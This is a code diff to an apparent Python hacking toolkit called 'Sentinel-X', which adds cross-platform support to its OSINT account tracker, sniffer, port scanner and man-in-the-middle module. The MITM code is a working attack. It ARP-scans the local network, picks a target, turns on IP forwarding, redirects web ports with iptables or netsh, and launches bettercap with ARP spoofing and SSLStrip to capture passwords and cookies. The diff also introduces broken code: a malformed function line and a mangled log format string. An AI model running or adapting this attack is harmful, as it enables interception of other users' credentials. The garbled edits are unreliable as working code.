@@ -5,6 +5,7 @@ import threading
 import requests
 import ssl
 import os
+import platform
 import random
 from datetime import datetime
 from colorama import Fore, Back, Style, init
@@ -13,8 +14,10 @@ import subprocess
 import shutil
 import signal
 
+IS_WINDOWS = os.name == 'nt'
+
 try:
-    from scapy.all import sniff, ARP, Ether, srp, conf
+    from scapy.all import ARP, Ether, srp, conf, get_if_list, sniff
     conf.verb = 0 
     SCAPY_AVAILABLE = True
 except ImportError:
@@ -33,7 +36,8 @@ def speak(text):
 def log(text, level="INFO"):
     t = datetime.now().strftime("%H:%M:%S")
     colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ALERT": Fore.RED, "WARN": Fore.YELLOW}
-    print(f"{Fore.WHITE}[{t}] {colors[level]}[{level}] {Fore.WHITE}{text}")
+    print(f"{Fore.WHITE}[{t}] [colors{level}[{level}] {Fore.WHITE}{text}]")
+    return
 
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -137,33 +141,43 @@ def osint_tracker():
         "Hackerone": f"https://hackerone.com/profile/{target}"
     }
 
-    found_list = []
+    try:
+        found_list = []
 
-    def check_site(site, url):
-        try:
-            r = requests.get(url, headers=headers, timeout=5)
-            if r.status_code == 200:
-                print(Fore.GREEN + f"[+] DETECTED: {site:<15} -> {url}")
-                found_list.append(site)
-            elif r.status_code == 404:
+        def check_site(site, url):
+            try:
+                r = requests.get(url, headers=headers, timeout=5)
+                if r.status_code == 200:
+                    print(Fore.GREEN + f"[+] DETECTED: {site:<15} -> {url}")
+                    found_list.append(site)
+                elif r.status_code == 404:
+                    pass
+            except:
                 pass
-        except:
-            pass
-    threads = []
-    for site, url in sites.items():
-        t = threading.Thread(target=check_site, args=(site, url))
-        threads.append(t)
-        t.start()
-    
-    for t in threads: t.join()
+        threads = []
+        for site, url in sites.items():
+            t = threading.Thread(target=check_site, args=(site, url))
+            threads.append(t)
+            t.start()
+        
+        for t in threads: t.join()
 
-    print(Fore.CYAN + "----------------------------------------------------")
-    if found_list:
-        speak(f"Scan complete. Found {len(found_list)} accounts.")
-        print(Fore.YELLOW + f"[*] SUMMARY: Target found on {len(found_list)} platforms.")
-    else:
-        speak("No accounts found.")
-        print(Fore.RED + "[!] No matches found. Target may be using privacy settings.")
+        print(Fore.CYAN + "----------------------------------------------------")
+        if found_list:
+            speak(f"Scan complete. Found {len(found_list)} accounts.")
+            print(Fore.YELLOW + f"[*] SUMMARY: Target found on {len(found_list)} platforms.")
+        else:
+            speak("No accounts found.")
+            print(Fore.RED + "[!] No matches found. Target may be using privacy settings.")
+        
+        input("Press ENTER to return to Sentinel-X Menu...")
+    except KeyboardInterrupt:
+        print("returning to Sentinel-X Menu...")
+        time.sleep(2)
+        return
+    except Exception as e:
+        print(e)
+        return
 
 # --- 2. REAL PHISHING DETECTOR ---
 def phishing_check():
@@ -189,6 +203,8 @@ def phishing_check():
 
     except Exception as e:
         print(Fore.RED + f"[!] SECURITY ALERT: {e}")
+
+    input("Press ENTER to return to Sentinel-X Menu...")
 
 # ------------------------------------------------------ 3. REAL WEB RECON -----------------------------------------------------------------
 def web_pentest():
@@ -238,40 +254,106 @@ def network_sniffer():
         speak("Capture buffer full. Stopping.")
     except PermissionError:
         log("Run as Administrator to sniff packets!", "ERROR")
+    
+    input("Press ENTER to return to Sentinel-X Menu...")
 
 # ------------------------------------------------------------------- 5. REAL ARP NETWORK SCANNER (Replaces Fake MITM) ----------------------------------------------------
 ## --- CORE UTILITY: TOOL CHECK ---
+def check_dependencies():IS_WINDOWS = os.name == 'nt'
+
 def check_dependencies():
-    essential_tools = ["bettercap", "mitmdump", "iptables"]
+    # Adjusted list based on OS because 'iptables' does not exist on Windows
+    if IS_WINDOWS:
+        essential_tools = ["bettercap", "mitmdump"] 
+    else:
+        essential_tools = ["bettercap", "mitmdump", "iptables"]
+        
     missing = [tool for tool in essential_tools if not shutil.which(tool)]
     return missing
 
+def get_local_ip():
+    # Cross-platform method to get local IP
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
+
+def enable_ip_forwarding(enable=True):
+    if IS_WINDOWS:
+        # Powershell command for Windows
+        state = "Enabled" if enable else "Disabled"
+        subprocess.run(["powershell", f"Set-NetIPInterface -Forwarding {state}"], capture_output=True)
+    else:
+        # Sysctl for Linux
+        val = "1" if enable else "0"
+        os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")
+
+def set_port_redirection(interface, local_ip, enable=True):
+    if IS_WINDOWS:
+        if enable:
+            # Netsh portproxy for Windows (Redirect 80/443 -> 8080)
+            os.system(f"netsh interface portproxy add v4tov4 listenport=80 connectaddress={local_ip} connectport=8080")
+            os.system(f"netsh interface portproxy add v4tov4 listenport=443 connectaddress={local_ip} connectport=8080")
+        else:
+            # Reset netsh
+            os.system("netsh interface portproxy reset")
+    else:
+        if enable:
+            # Iptables for Linux
+            os.system("iptables -t nat -F")
+            os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
+            os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")
+        else:
+            # Flush iptables
+            os.system("iptables -t nat -F")
+
 def mitm_simulation():
+    # 1. Check Dependencies
     missing = check_dependencies()
     if missing:
         log(f"Missing tools: {', '.join(missing)}. Install them first!", "ALERT")
+        input("Press ENTER to return to Sentinel-X Menu...")
         return
 
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('cls' if IS_WINDOWS else 'clear')
 
     print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
     print(f"{Fore.WHITE}   SENTINEL-X ELITE   |   INTERNAL NETWORK EXPLOITATION V3.0")
     print(f"{Fore.RED}" + "═"*65)
 
     try:
-        ifaces = os.listdir('/sys/class/net/')
+        # 2. Interface Selection (Cross-Platform)
+        if IS_WINDOWS:
+            from scapy.arch.windows import get_windows_if_list
+            win_ifaces = get_windows_if_list()
+            ifaces = [i['name'] for i in win_ifaces] # Use GUID/Name
+            display_names = [i['description'] for i in win_ifaces]
+        else:
+            ifaces = os.listdir('/sys/class/net/')
+            display_names = ifaces
+
         print(f"{Fore.YELLOW}[*] Available Interfaces:")
-        for i, iface in enumerate(ifaces):
-            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{iface}")
+        for i, name in enumerate(display_names):
+            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{name}")
         
         if_choice = int(input(f"\n{Fore.YELLOW}Select Interface ID: {Fore.WHITE}"))
-        interface = ifaces[if_choice]
+        interface = ifaces[if_choice] # Actual interface name/GUID used by OS
 
+        # 3. Network Scanning
         log(f"Broadcasting ARP on {interface}...", "INFO")
-        from scapy.all import ARP, Ether, srp
-        net_prefix = ".".join(os.popen("hostname -I").read().split()[0].split(".")[:-1]) + ".0/24"
+        
+        local_ip = get_local_ip()
+        net_prefix = ".".join(local_ip.split(".")[:-1]) + ".0/24"
+        
         print(f"{Fore.CYAN}[?] Scanning default range: {net_prefix}")
         
+        # Scapy Scan
+        conf.verb = 0
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_prefix), timeout=3, iface=interface, verbose=False)
         
         devices = []
@@ -280,36 +362,48 @@ def mitm_simulation():
             devices.append(r.psrc)
             print(f"{Fore.GREEN}{i}\t{r.psrc:<15}\t{Fore.WHITE}{r.hwsrc}")
         
-        target_idx = int(input(f"\n{Fore.YELLOW}Select Target ID: {Fore.WHITE}"))
+        if not devices:
+            log("No devices found. Exiting.", "ALERT"); return
+
+        target_idx = int(input(f"\n{Fore.YELLOW}Ctrl + C to leave OR Select Target ID: {Fore.WHITE}"))
         target_ip = devices[target_idx]
         gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Fore.WHITE}")
 
+    except KeyboardInterrupt:
+        print("returning to Sentinel-X Menu...")
+        time.sleep(2)
+        return
     except Exception as e:
         log(f"Setup Error: {e}", "ERROR")
+        time.sleep(3)
         return
+
+    # 4. Setup Logging
     log_folder = "sentinel_vault"
     if not os.path.exists(log_folder): os.makedirs(log_folder)
     
     session_id = datetime.now().strftime("%H%M%S")
     pcap_out = f"{log_folder}/session_{session_id}.pcap"
-    cred_out = f"{log_folder}/creds_{session_id}.txt"
+    
     try:
         speak("Initializing elite interception engines.")
         log("Hardening Network Configuration...", "INFO")
         
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        os.system("iptables -t nat -F") 
-        
-        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
-        os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")
+        # 5. Enable Forwarding & Redirect Traffic (OS Specific)
+        enable_ip_forwarding(True)
+        set_port_redirection(interface, local_ip, True)
 
+        # 6. Launch MITM Tools
+        # mitmdump command
+        mitm_cmd = ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out]
+        # Windows often requires socks mode or specific config, but keeping transparent as requested
+        
         mitm_proc = subprocess.Popen(
-            ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out],
+            mitm_cmd,
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
 
-        # Launching Bettercap (with SSLStrip & ARP Spoof)
-        # SSLStrip bettercap mein 'http.proxy' se handle hota hai
+        # Bettercap command
         better_cmd = [
             "bettercap", "-iface", interface, "-eval", 
             f"set arp.spoof.targets {target_ip}; set http.proxy.sslstrip true; arp.spoof on; net.sniff on"
@@ -318,8 +412,8 @@ def mitm_simulation():
 
         time.sleep(3)
 
-        # 5. DASHBOARD UI
-        os.system('cls' if os.name == 'nt' else 'clear')
+        # 7. Dashboard UI
+        os.system('cls' if IS_WINDOWS else 'clear')
         print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
         print(f"{Fore.WHITE}   STRIKE STATUS: {Fore.GREEN}RUNNING")
         print(f"{Fore.RED}" + "═"*65)
@@ -329,11 +423,9 @@ def mitm_simulation():
         print(f"{Fore.YELLOW} SSLSTRIP : {Fore.GREEN}ENABLED")
         print(f"{Fore.RED}" + "═"*65)
         
-        print(f"\n{Fore.CYAN}[*] Scentinel-X is now a bridge between Target and Router.")
+        print(f"\n{Fore.CYAN}[*] Sentinel-X is now a bridge between Target and Router.")
         print(f"{Fore.WHITE}[!] Monitoring for Clear-text Passwords & Cookies...")
         print(f"{Fore.RED}[!] Press CTRL+C to Safely Stop and Save Data.")
-
-        
 
         while True:
             if mitm_proc.poll() is not None or better_proc.poll() is not None:
@@ -347,15 +439,27 @@ def mitm_simulation():
     except KeyboardInterrupt:
         print(f"\n\n{Fore.YELLOW}[!] TERMINATION SIGNAL RECEIVED.")
 
-        better_proc.send_signal(signal.SIGINT)
-        mitm_proc.send_signal(signal.SIGINT)
+        # 8. Cleanup
+        # Send SIGINT (CTRL+C)
+        if IS_WINDOWS:
+             # Windows doesn't handle SIGINT to subprocesses well, using terminate
+            better_proc.terminate()
+            mitm_proc.terminate()
+        else:
+            better_proc.send_signal(signal.SIGINT)
+            mitm_proc.send_signal(signal.SIGINT)
+        
         time.sleep(2)
         
-        better_proc.terminate()
-        mitm_proc.terminate()
+        # Force kill if still running
+        if better_proc.poll() is None: better_proc.terminate()
+        if mitm_proc.poll() is None: mitm_proc.terminate()
+
         log("Restoring Network Settings...", "INFO")
-        os.system("iptables -t nat -F")
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        
+        # Restore Network Tables
+        set_port_redirection(interface, local_ip, False)
+        enable_ip_forwarding(False)
         
         print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════╗")
         print(f"║ {Fore.WHITE}SESSION ARCHIVED: {pcap_out:<33} ║")
@@ -364,8 +468,12 @@ def mitm_simulation():
         
         speak("Interception successful. Data archived in vault.")
         time.sleep(3)
-        banner()
-
+        banner() 
+        input("Press ENTER to return to Sentinel-X Menu...")  
+    except:
+         input("Press ENTER to return to Sentinel-X Menu...")  
+         return
+    input("Press ENTER to return to Sentinel-X Menu...")
 # ---------------------------------------------------------------- 6. REAL MULTI-THREADED PORT SCANNER --------------------------------------------------------------
 def port_scanner():
     import socket
@@ -391,7 +499,6 @@ def port_scanner():
     # --- Input ---
     try: speak("Port Scanner initialized.")
     except: pass
-    
     target = input(Fore.WHITE + "\nroot@sentinel:~/nmap# Enter Target IP: ")
     
     # --- Scan Header ---
